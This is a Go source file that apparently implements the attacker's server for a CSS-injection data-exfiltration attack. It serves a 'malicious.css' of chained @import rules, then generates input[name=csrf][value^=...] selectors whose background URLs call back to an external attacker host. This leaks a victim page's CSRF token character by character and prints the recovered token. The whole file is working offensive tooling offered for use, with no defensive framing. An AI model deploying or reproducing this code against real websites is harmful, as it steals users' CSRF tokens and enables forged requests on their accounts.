package cssrf

import (
	"bytes"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"text/template"

	"github.com/ariary/go-utils/pkg/color"
)

//FirstLoad: target load malicious.css => begin trial and errors to retrieve data
func FirstLoad(cfg *Config) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("🍁 Load malicious.css")
		sendImports(w, cfg.ImportTemplate, cfg.Length)
	})
}

//Waiting: wait sufficient amount of data has been retrieved before
//responding with a css payload that load background images to exfiltrate further data
func Waiting(cfg *Config) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		len := r.URL.Query()["len"][0]
		if len == "" {
			fmt.Println("failed to retrieve 'len' parameter in", r.URL.RawQuery)
			w.Write([]byte("OK")) //answer anyway
		} else {
			if lenInt, err := strconv.Atoi(len); err != nil {
				fmt.Println("failed to convert", len, "into int")
			} else {
				wait(w, cfg, lenInt)
			}
		}
	})
}

//Callback: Call when css condition is met ~ data has been exfiltrated. Retrieve partial token, compute len and unblock channel
//corresponding to the next character to be found
func Callback(cfg *Config) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		partialToken := r.URL.Query()["token"][0]
		lenPartial := len(partialToken)
		if partialToken == "" {
			fmt.Println("failed to retrieve 'token' parameter")
		} else if lenPartial == cfg.Length {
			fmt.Println("🥜🌰 Here is your nuts:", color.Green(partialToken))
			w.Write([]byte("OK"))
		} else {
			fmt.Println("🍃 retrieve data...", color.Cyan(partialToken))
			//unblock next character research
			go func() { cfg.Channels[lenPartial] <- partialToken }()
			w.Write([]byte("OK")) //answer anyway, don't be cocky
		}
	})
}

func InitTemplates(cfg *Config) {
	//"import" template
	var importTpl bytes.Buffer
	data := struct {
		ExternalUrl string
	}{
		ExternalUrl: cfg.ExternalUrl,
	}
	tImp := template.Must(template.New("imports").Parse(`@import url("{{ .ExternalUrl}}`))
	tImp.Execute(&importTpl, data)
	cfg.ImportTemplate = "{{range $val := .}}\n" + importTpl.String() + "/waiting?len={{$val}}\");{{end}}"
	//"background" template
	var backTpl bytes.Buffer
	tBack := template.Must(template.New("trialAndError").Parse(`}}] { background: url({{ .ExternalUrl}}/callback?token=`))
	tBack.Execute(&backTpl, data)
	cfg.BackgroundTemplate = "{{range $val := .}}\ninput[name=csrf][value^={{$val" + backTpl.String() + "{{$val}}); }{{end}}"
}

func craftImports(tpl string, len int) (result string, err error) {
	var countLen []int
	for i := 0; i < len; i++ {
		countLen = append(countLen, i)
	}
	var tplBytes bytes.Buffer

	t := template.Must(template.New("imports").Parse(tpl))
	if err := t.Execute(&tplBytes, countLen); err != nil {
		return "", err
	}
	result = tplBytes.String()
	return result, nil
}

func sendImports(w http.ResponseWriter, tpl string, len int) {
	imports, err := craftImports(tpl, len)
	if err != nil {
		fmt.Println("failed crafting imports:", err)
		w.Write([]byte("OK")) // answer anyway
	} else {
		w.Header().Add("content-type", "text/css")
		w.Write([]byte(imports))
	}
}

func sendBackgroundPayload(w http.ResponseWriter, partial string, cfg Config) {
	// for j in range charset
	//     response css with background loading at url/callback?token=channel[i]+charset[j]
	payload, err := craftBackgroundPayload(cfg.BackgroundTemplate, partial, strings.Split(cfg.Charset, ""))
	if err != nil {
		fmt.Println("failed crafting background payload:", err)
		w.Write([]byte("OK")) // answer anyway
	} else {
		w.Header().Add("content-type", "text/css")
		w.Write([]byte(payload))
	}
}

func craftBackgroundPayload(tpl string, prefix string, charset []string) (result string, err error) {
	var nCharset []string
	for i := 0; i < len(charset); i++ {
		nCharset = append(nCharset, prefix+charset[i])
	}
	var tplBytes bytes.Buffer
	data := struct {
		charset []string
	}{
		charset: nCharset,
	}

	t := template.Must(template.New("trialAndError").Parse(tpl))
	if err := t.Execute(&tplBytes, data.charset); err != nil {
		return "", err
	}
	result = tplBytes.String()
	return result, nil
}

func wait(w http.ResponseWriter, cfg *Config, i int) {
	if i == 0 {
		sendBackgroundPayload(w, "", *cfg)
	} else {
		partialToken := <-cfg.Channels[i]
		sendBackgroundPayload(w, partialToken, *cfg)
	}
}
